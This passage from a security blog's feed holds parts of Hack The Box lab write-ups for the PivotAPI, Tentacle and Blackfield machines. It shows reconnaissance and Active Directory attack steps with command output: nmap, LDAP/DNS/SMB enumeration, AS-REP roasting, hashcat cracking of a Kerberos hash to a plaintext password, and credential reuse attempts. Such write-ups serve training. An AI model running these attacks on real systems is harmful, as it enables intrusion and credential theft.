+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://LicorDeBellota.htb -x -b &amp;#34;DC=LicorDeBellota,DC=htb&amp;#34;
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;DC=LicorDeBellota,DC=htb&amp;gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
+tion a successful bind must be completed on the connection., data 0, v4563
+# numResponses: 1
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>No results for &lt;code>rpc&lt;/code>&lt;/li>
+&lt;li>&lt;code>ftp&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ ftp anonymous@10.10.10.240
+Connected to 10.10.10.240.
+220 Microsoft FTP Service
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&amp;gt; ls
+229 Entering Extended Passive Mode (|||57367|)
+150 Opening ASCII mode data connection.
+02-19-21 03:06PM 103106 10.1.1.414.6453.pdf
+02-19-21 03:06PM 656029 28475-linux-stack-based-buffer-overflows.pdf
+02-19-21 12:55PM 1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
+02-19-21 03:06PM 1018160 ExploitingSoftware-Ch07.pdf
+08-08-20 01:18PM 219091 notes1.pdf
+08-08-20 01:34PM 279445 notes2.pdf
+08-08-20 01:41PM 105 README.txt
+02-19-21 03:06PM 1301120 RHUL-MA-2009-06.pdf
+226 Transfer complete.
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Running &lt;code>exiftool&lt;/code> on &lt;code>pdf&lt;/code> files shows &lt;code>LicorDeBellota.htb\kaorz&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>======== notes2.pdf
+ExifTool Version Number : 12.67
+File Name : notes2.pdf
+Directory : .
+File Size : 279 kB
+File Modification Date/Time : 2020:08:08 12:34:25+01:00
+File Access Date/Time : 2023:10:06 19:12:03+01:00
+File Inode Change Date/Time : 2023:10:06 19:12:03+01:00
+File Permissions : -rw-r--r--
+File Type : PDF
+File Type Extension : pdf
+MIME Type : application/pdf
+PDF Version : 1.5
+Linearized : No
+Page Count : 5
+XMP Toolkit : Image::ExifTool 12.03
+Creator : Kaorz
+Publisher : LicorDeBellota.htb
+Producer : cairo 1.10.2 (http://cairographics.org)
+&lt;/code>&lt;/pre>&lt;h2 id="foothold">Foothold&lt;/h2>
+&lt;ul>
+&lt;li>Let&amp;rsquo;s check if user is &lt;code>AS-REP&lt;/code>-roastable&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ impacket-GetNPUsers -dc-ip PivotAPI.LicorDeBellota.htb LicorDeBellota.htb/kaorz -no-pass
+Impacket v0.11.0 - Copyright 2023 Fortra
+[*] Getting TGT for kaorz
+$krb5asrep$23$kaorz@LICORDEBELLOTA.HTB:117660010b88116ef19ce2f9e608d1d9$a8f47a80fddd556b91bb360af849916358388168cf2ed0c2783c95ff09d799d504477fefe0d1a9ab33a92243939260e558b739cedd2a8c3d61bf85ae56360069cd38a4f14b04865afdbbbf99a3816da14b41058a0249c62c180d50337a6e3c27da5cdde876ca8b4f70f1d5624c1f3358e0a451bb5ec9cb3ee580148951680f5d06f2ce8c11bf61cb8600cbb290dd046a12ad9c8cae68e4ca9706c904189e4ef0a192f8cc192e6286241547ae151111d074323e54a174b945156365f6db2f80d9b7ec558ffa64b7fcd93206f055ecfbf973fa4fff67f20ea88d63fdc29d6aea709c7da2d8073ef9f7fcc3f36a39160138e0679042f7fd8441
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Let&amp;rsquo;s crack it
+&lt;ul>
+&lt;li>&lt;code>kaorz:Roper4155&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1435/2934 MB (512 MB allocatable), 2MCU
+...
+$krb5asrep$23$kaorz@LICORDEBELLOTA.HTB:117660010b88116ef19ce2f9e608d1d9$a8f47a80fddd556b91bb360af849916358388168cf2ed0c2783c95ff09d799d504477fefe0d1a9ab33a92243939260e558b739cedd2a8c3d61bf85ae56360069cd38a4f14b04865afdbbbf99a3816da14b41058a0249c62c180d50337a6e3c27da5cdde876ca8b4f70f1d5624c1f3358e0a451bb5ec9cb3ee580148951680f5d06f2ce8c11bf61cb8600cbb290dd046a12ad9c8cae68e4ca9706c904189e4ef0a192f8cc192e6286241547ae151111d074323e54a174b945156365f6db2f80d9b7ec558ffa64b7fcd93206f055ecfbf973fa4fff67f20ea88d63fdc29d6aea709c7da2d8073ef9f7fcc3f36a39160138e0679042f7fd8441:Roper4155
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>The creds didn&amp;rsquo;t work for &lt;code>ssh&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ sshpass -p &amp;#39;Roper4155&amp;#39; ssh kaorz@10.10.10.240
+Warning: Permanently added &amp;#39;10.10.10.240&amp;#39; (ED25519) to the list of known hosts.
+Permission denied, please try again.
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>No &lt;code>SPN&lt;/code>s&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ impacket-GetUserSPNs LicorDeBellota.htb/Kaorz:&amp;#39;Roper4155&amp;#39; -dc-ip 10.10.10.240
+Impacket v0.11.0 - Copyright 2023 Fortra
+No entries found!
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>No access to &lt;code>mysql&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ impacket-mssqlclient LicorDeBellota.htb/Kaorz:&amp;#39;Roper4155&amp;#39;@10.10.10.240 -windows-auth
+Impacket v0.11.0 - Copyright 2023 Fortra
+[*] Encryption required, switching to TLS
+[-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario &amp;#39;LICORDEBELLOTA\Kaorz&amp;#39;.
+&lt;/code>&lt;/pre>&lt;h2 id="user">User&lt;/h2>
+&lt;ul>
+&lt;li>Let&amp;rsquo;s check &lt;code>bloodhound&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ bloodhound-python -u kaorz -p &amp;#39;Roper4155&amp;#39; -d licordebellota.htb -dc licordebellota.htb -ns 10.10.10.240 --zip
+INFO: Found AD domain: licordebellota.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: licordebellota.htb
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Found 28 users
+INFO: Connecting to LDAP server: licordebellota.htb
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 58 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: PivotAPI.LicorDeBellota.htb
+INFO: Done in 00M 16S
+INFO: Compressing output into 20231007112624_bloodhound.zip
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Nothing interesting
+&lt;ul>
+&lt;li>&lt;code>Domain Users&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/pivotapi/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Tentacle</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/tentacle/</link><pubDate>Wed, 27 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/tentacle/</guid><description>&lt;h1 id="tentacle">Tentacle&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.224 -T4 --min-rate 5000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 20:09 BST
+Nmap scan report for 10.10.10.224 (10.10.10.224)
+Host is up (0.093s latency).
+Not shown: 65495 filtered tcp ports (no-response), 36 filtered tcp ports (host-unreach)
+PORT STATE SERVICE
+22/tcp open ssh
+53/tcp open domain
+88/tcp open kerberos-sec
+3128/tcp open squid-http
+Nmap done: 1 IP address (1 host up) scanned in 39.58 seconds
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p22,53,88,3128 -sC -sV 10.10.10.224 -T4 --min-rate 5000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 20:12 BST
+Nmap scan report for 10.10.10.224 (10.10.10.224)
+Host is up (0.12s latency).
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey:
+| 3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
+| 256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
+|_ 256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
+53/tcp open domain ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
+| dns-nsid:
+|_ bind.version: 9.11.20-RedHat-9.11.20-5.el8
+88/tcp open kerberos-sec MIT Kerberos (server time: 2023-09-26 19:11:56Z)
+3128/tcp open http-proxy Squid http proxy 4.11
+|_http-server-header: squid/4.11
+|_http-title: ERROR: The requested URL could not be retrieved
+Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.44 seconds
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ sudo nmap -Pn -sU 10.10.10.224 -T4 --min-rate 5000
+[sudo] password for kali:
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 20:13 BST
+Nmap scan report for 10.10.10.224 (10.10.10.224)
+Host is up (0.10s latency).
+Not shown: 991 open|filtered udp ports (no-response)
+PORT STATE SERVICE
+53/udp open domain
+88/udp open kerberos-sec
+123/udp open ntp
+17787/udp filtered unknown
+20560/udp filtered unknown
+21016/udp filtered unknown
+40019/udp filtered unknown
+44185/udp filtered unknown
+49179/udp filtered unknown
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>dns&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ dig axfr @10.10.10.224
+;; communications error to 10.10.10.224#53: timed out
+;; communications error to 10.10.10.224#53: timed out
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.16-1-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr @10.10.10.224
+; (1 server found)
+;; global options: +cmd
+;; Query time: 175 msec
+;; SERVER: 10.10.10.224#53(10.10.10.224) (UDP)
+;; WHEN: Wed Sep 27 17:09:26 BST 2023
+;; MSG SIZE rcvd: 56
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ dig realcorp.htb @10.10.10.224
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.16-1-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; realcorp.htb @10.10.10.224
+;; global options: +cmd
+;; Got answer:
+;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 20726
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: 1d3b122485d1c4e6706e605e651453ed994c22dca6111a8b (good)
+;; QUESTION SECTION:
+;realcorp.htb. IN A
+;; AUTHORITY SECTION:
+realcorp.htb. 86400 IN SOA realcorp.htb. root.realcorp.htb. 199609206 28800 7200 2419200 86400
+;; Query time: 91 msec
+;; SERVER: 10.10.10.224#53(10.10.10.224) (UDP)
+;; WHEN: Wed Sep 27 17:11:02 BST 2023
+;; MSG SIZE rcvd: 110
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ dig axfr realcorp.htb @10.10.10.224
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.16-1-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr realcorp.htb @10.10.10.224
+;; global options: +cmd
+; Transfer failed.
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>dnsenum&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ dnsenum --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt realcorp.htb
+dnsenum VERSION:1.2.6
+----- realcorp.htb -----
+Host&amp;#39;s addresses:
+__________________
+Name Servers:
+______________
+ns.realcorp.htb. 259200 IN A 10.197.243.77
+Mail (MX) Servers:
+___________________
+Trying Zone Transfers and getting Bind Versions:
+_________________________________________________
+unresolvable name: ns.realcorp.htb at /usr/bin/dnsenum line 900.
+Trying Zone Transfer for realcorp.htb on ns.realcorp.htb ...
+AXFR record query failed: no nameservers
+Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:
+________________________________________________________________________________________
+ns.realcorp.htb. 259200 IN A 10.197.243.77
+proxy.realcorp.htb. 259200 IN CNAME ns.realcorp.htb.
+ns.realcorp.htb. 259200 IN A 10.197.243.77
+wpad.realcorp.htb. 259200 IN A 10.197.243.31
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>kerbrute&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ ./kerbrute userenum -d realcorp.htb --dc realcorp.htb /usr/share/seclists/Usernames/cirt-default-usernames.txt
+__ __ __
+/ /_____ _____/ /_ _______ __/ /____
+/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+/ ,&amp;lt; / __/ / / /_/ / / / /_/ / /_/ __/
+/_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/
+Version: v1.0.3 (9dad6e1) - 09/27/23 - Ronnie Flathers @ropnop
+2023/09/27 17:24:12 &amp;gt; Using KDC(s):
+2023/09/27 17:24:12 &amp;gt; realcorp.htb:88
+2023/09/27 17:24:27 &amp;gt; Done! Tested 828 usernames (0 valid) in 15.460 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>ntp&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ sudo nmap -Pn --script &amp;#34;ntp*&amp;#34; -sU -sV -p123 realcorp.htb
+[sudo] password for kali:
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 17:27 BST
+Nmap scan report for realcorp.htb (10.10.10.224)
+Host is up (0.13s latency).
+PORT STATE SERVICE VERSION
+123/udp open ntp NTP v4 (secondary server)
+| ntp-info:
+|_ receive time stamp: 2023-09-27T16:26:39
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.67 seconds
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ date; ntpdate -q 10.10.10.224
+Wed Sep 27 05:30:03 PM BST 2023
+2023-09-27 17:29:22.601161 (+0100) -40.729112 +/- 0.083173 10.10.10.224 s10 no-leap
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>squid&lt;/code> version &lt;code>4.11&lt;/code>
+&lt;ul>
+&lt;li>&lt;code>srv01.realcorp.htb&lt;/code>&lt;/li>
+&lt;li>user: &lt;code>j.nakazawa@realcorp.htb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/tentacle/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Blackfield</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/blackfield/</link><pubDate>Sun, 17 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/blackfield/</guid><description>&lt;h1 id="blackfield">Blackfield&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.192 --min-rate 5000 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 18:54 BST
+Nmap scan report for 10.10.10.192 (10.10.10.192)
+Host is up (0.11s latency).
+Not shown: 65526 filtered tcp ports (no-response)
+PORT STATE SERVICE
+53/tcp open domain
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+593/tcp open http-rpc-epmap
+3268/tcp open globalcatLDAP
+5985/tcp open wsman
+Nmap done: 1 IP address (1 host up) scanned in 35.69 seconds
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p53,88,135,389,445,593,3268,5985 -sC -sV 10.10.10.192 --min-rate 5000 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 18:56 BST
+Nmap scan report for 10.10.10.192 (10.10.10.192)
+Host is up (0.15s latency).
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-18 00:55:30Z)
+135/tcp open msrpc Microsoft Windows RPC
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+445/tcp open microsoft-ds?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-security-mode:
+| 3:1:1:
+|_ Message signing enabled and required
+|_clock-skew: 6h59m20s
+| smb2-time:
+| date: 2023-09-18T00:55:39
+|_ start_date: N/A
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 54.42 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.192
+Sharename Type Comment
+--------- ---- -------
+ADMIN$ Disk Remote Admin
+C$ Disk Default share
+forensic Disk Forensic / Audit share.
+IPC$ IPC Remote IPC
+NETLOGON Disk Logon server share
+profiles$ Disk
+SYSVOL Disk Logon server share
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.192 failed (Error NT_STATUS_IO_TIMEOUT)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>dns&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ sudo vim /etc/hosts
+[sudo] password for kali:
+┌──(kali㉿kali)-[~/Documents/tasks]
+└─$ dig @10.10.10.192 BLACKFIELD.local
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.16-1-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @10.10.10.192 BLACKFIELD.local
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; WARNING: .local is reserved for Multicast DNS
+;; You are currently testing what happens when an mDNS query is leaked to DNS
+;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 26635
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4000
+;; QUESTION SECTION:
+;BLACKFIELD.local. IN A
+;; ANSWER SECTION:
+BLACKFIELD.local. 600 IN A 10.10.10.192
+;; Query time: 95 msec
+;; SERVER: 10.10.10.192#53(10.10.10.192) (UDP)
+;; WHEN: Sun Sep 17 19:03:32 BST 2023
+;; MSG SIZE rcvd: 61
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ dig axfr @10.10.10.192 BLACKFIELD.local
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.16-1-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr @10.10.10.192 BLACKFIELD.local
+; (1 server found)
+;; global options: +cmd
+; Transfer failed.
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>ldap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.192 -x -s base namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;&amp;gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts
+#
+#
+dn:
+namingcontexts: DC=BLACKFIELD,DC=local
+namingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local
+namingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
+namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
+namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local
+# search result
+search: 2
+result: 0 Success
+# numResponses: 2
+# numEntries: 1
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.192 -x -b &amp;#34;DC=BLACKFIELD,DC=local&amp;#34;
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;DC=BLACKFIELD,DC=local&amp;gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
+tion a successful bind must be completed on the connection., data 0, v4563
+# numResponses: 1
+&lt;/code>&lt;/pre>&lt;h2 id="foothold">Foothold&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N //10.10.10.192/profiles$
+Try &amp;#34;help&amp;#34; to get a list of possible commands.
+smb: \&amp;gt; ls
+. D 0 Wed Jun 3 17:47:12 2020
+.. D 0 Wed Jun 3 17:47:12 2020
+AAlleni D 0 Wed Jun 3 17:47:11 2020
+ABarteski D 0 Wed Jun 3 17:47:11 2020
+ABekesz D 0 Wed Jun 3 17:47:11 2020
+ABenzies D 0 Wed Jun 3 17:47:11 2020
+ABiemiller D 0 Wed Jun 3 17:47:11 2020
+AChampken D 0 Wed Jun 3 17:47:11 2020
+ACheretei D 0 Wed Jun 3 17:47:11 2020
+ACsonaki D 0 Wed Jun 3 17:47:11 2020
+AHigchens D 0 Wed Jun 3 17:47:11 2020
+AJaquemai D 0 Wed Jun 3 17:47:11 2020
+AKlado D 0 Wed Jun 3 17:47:11 2020
+AKoffenburger D 0 Wed Jun 3 17:47:11 2020
+AKollolli D 0 Wed Jun 3 17:47:11 2020
+AKruppe D 0 Wed Jun 3 17:47:11 2020
+AKubale D 0 Wed Jun 3 17:47:11 2020
+ALamerz D 0 Wed Jun 3 17:47:11 2020
+AMaceldon D 0 Wed Jun 3 17:47:11 2020
+AMasalunga D 0 Wed Jun 3 17:47:11 2020
+ANavay D 0 Wed Jun 3 17:47:11 2020
+ANesterova D 0 Wed Jun 3 17:47:11 2020
+ANeusse D 0 Wed Jun 3 17:47:11 2020
+AOkleshen D 0 Wed Jun 3 17:47:11 2020
+APustulka D 0 Wed Jun 3 17:47:11 2020
+ARotella D 0 Wed Jun 3 17:47:11 2020
+ASanwardeker D 0 Wed Jun 3 17:47:11 2020
+AShadaia D 0 Wed Jun 3 17:47:11 2020
+ASischo D 0 Wed Jun 3 17:47:11 2020
+ASpruce D 0 Wed Jun 3 17:47:11 2020
+ATakach D 0 Wed Jun 3 17:47:11 2020
+ATaueg D 0 Wed Jun 3 17:47:11 2020
+ATwardowski D 0 Wed Jun 3 17:47:11 2020
+audit2020 D 0 Wed Jun 3 17:47:11 2020
+AWangenheim D 0 Wed Jun 3 17:47:11 2020
+AWorsey D 0 Wed Jun 3 17:47:11 2020
+AZigmunt D 0 Wed Jun 3 17:47:11 2020
+BBakajza D 0 Wed Jun 3 17:47:11 2020
+BBeloucif D 0 Wed Jun 3 17:47:11 2020
+BCarmitcheal D 0 Wed Jun 3 17:47:11 2020
+BConsultant D 0 Wed Jun 3 17:47:11 2020
+BErdossy D 0 Wed Jun 3 17:47:11 2020
+BGeminski D 0 Wed Jun 3 17:47:11 2020
+BLostal D 0 Wed Jun 3 17:47:11 2020
+BMannise D 0 Wed Jun 3 17:47:11 2020
+BNovrotsky D 0 Wed Jun 3 17:47:11 2020
+BRigiero D 0 Wed Jun 3 17:47:11 2020
+BSamkoses D 0 Wed Jun 3 17:47:11 2020
+BZandonella D 0 Wed Jun 3 17:47:11 2020
+CAcherman D 0 Wed Jun 3 17:47:12 2020
+CAkbari D 0 Wed Jun 3 17:47:12 2020
+CAldhowaihi D 0 Wed Jun 3 17:47:12 2020
+CArgyropolous D 0 Wed Jun 3 17:47:12 2020
+CDufrasne D 0 Wed Jun 3 17:47:12 2020
+CGronk D 0 Wed Jun 3 17:47:11 2020
+Chiucarello D 0 Wed Jun 3 17:47:11 2020
+Chiuccariello D 0 Wed Jun 3 17:47:12 2020
+CHoytal D 0 Wed Jun 3 17:47:12 2020
+CKijauskas D 0 Wed Jun 3 17:47:12 2020
+CKolbo D 0 Wed Jun 3 17:47:12 2020
+CMakutenas D 0 Wed Jun 3 17:47:12 2020
+CMorcillo D 0 Wed Jun 3 17:47:11 2020
+CSchandall D 0 Wed Jun 3 17:47:12 2020
+CSelters D 0 Wed Jun 3 17:47:12 2020
+CTolmie D 0 Wed Jun 3 17:47:12 2020
+DCecere D 0 Wed Jun 3 17:47:12 2020
+DChintalapalli D 0 Wed Jun 3 17:47:12 2020
+DCwilich D 0 Wed Jun 3 17:47:12 2020
+DGarbatiuc D 0 Wed Jun 3 17:47:12 2020
+DKemesies D 0 Wed Jun 3 17:47:12 2020
+DMatuka D 0 Wed Jun 3 17:47:12 2020
+DMedeme D 0 Wed Jun 3 17:47:12 2020
+DMeherek D 0 Wed Jun 3 17:47:12 2020
+DMetych D 0 Wed Jun 3 17:47:12 2020
+DPaskalev D 0 Wed Jun 3 17:47:12 2020
+DPriporov D 0 Wed Jun 3 17:47:12 2020
+DRusanovskaya D 0 Wed Jun 3 17:47:12 2020
+DVellela D 0 Wed Jun 3 17:47:12 2020
+DVogleson D 0 Wed Jun 3 17:47:12 2020
+DZwinak D 0 Wed Jun 3 17:47:12 2020
+EBoley D 0 Wed Jun 3 17:47:12 2020
+EEulau D 0 Wed Jun 3 17:47:12 2020
+EFeatherling D 0 Wed Jun 3 17:47:12 2020
+EFrixione D 0 Wed Jun 3 17:47:12 2020
+EJenorik D 0 Wed Jun 3 17:47:12 2020
+EKmilanovic D 0 Wed Jun 3 17:47:12 2020
+ElKatkowsky D 0 Wed Jun 3 17:47:12 2020
+EmaCaratenuto D 0 Wed Jun 3 17:47:12 2020
+EPalislamovic D 0 Wed Jun 3 17:47:12 2020
+EPryar D 0 Wed Jun 3 17:47:12 2020
+ESachhitello D 0 Wed Jun 3 17:47:12 2020
+ESariotti D 0 Wed Jun 3 17:47:12 2020
+ETurgano D 0 Wed Jun 3 17:47:12 2020
+EWojtila D 0 Wed Jun 3 17:47:12 2020
+FAlirezai D 0 Wed Jun 3 17:47:12 2020
+FBaldwind D 0 Wed Jun 3 17:47:12 2020
+FBroj D 0 Wed Jun 3 17:47:12 2020
+FDeblaquire D 0 Wed Jun 3 17:47:12 2020
+FDegeorgio D 0 Wed Jun 3 17:47:12 2020
+FianLaginja D 0 Wed Jun 3 17:47:12 2020
+FLasokowski D 0 Wed Jun 3 17:47:12 2020
+FPflum D 0 Wed Jun 3 17:47:12 2020
+FReffey D 0 Wed Jun 3 17:47:12 2020
+GaBelithe D 0 Wed Jun 3 17:47:12 2020
+Gareld D 0 Wed Jun 3 17:47:12 2020
+GBatowski D 0 Wed Jun 3 17:47:12 2020
+GForshalger D 0 Wed Jun 3 17:47:12 2020
+GGomane D 0 Wed Jun 3 17:47:12 2020
+GHisek D 0 Wed Jun 3 17:47:12 2020
+GMaroufkhani D 0 Wed Jun 3 17:47:12 2020
+GMerewether D 0 Wed Jun 3 17:47:12 2020
+GQuinniey D 0 Wed Jun 3 17:47:12 2020
+GRoswurm D 0 Wed Jun 3 17:47:12 2020
+GWiegard D 0 Wed Jun 3 17:47:12 2020
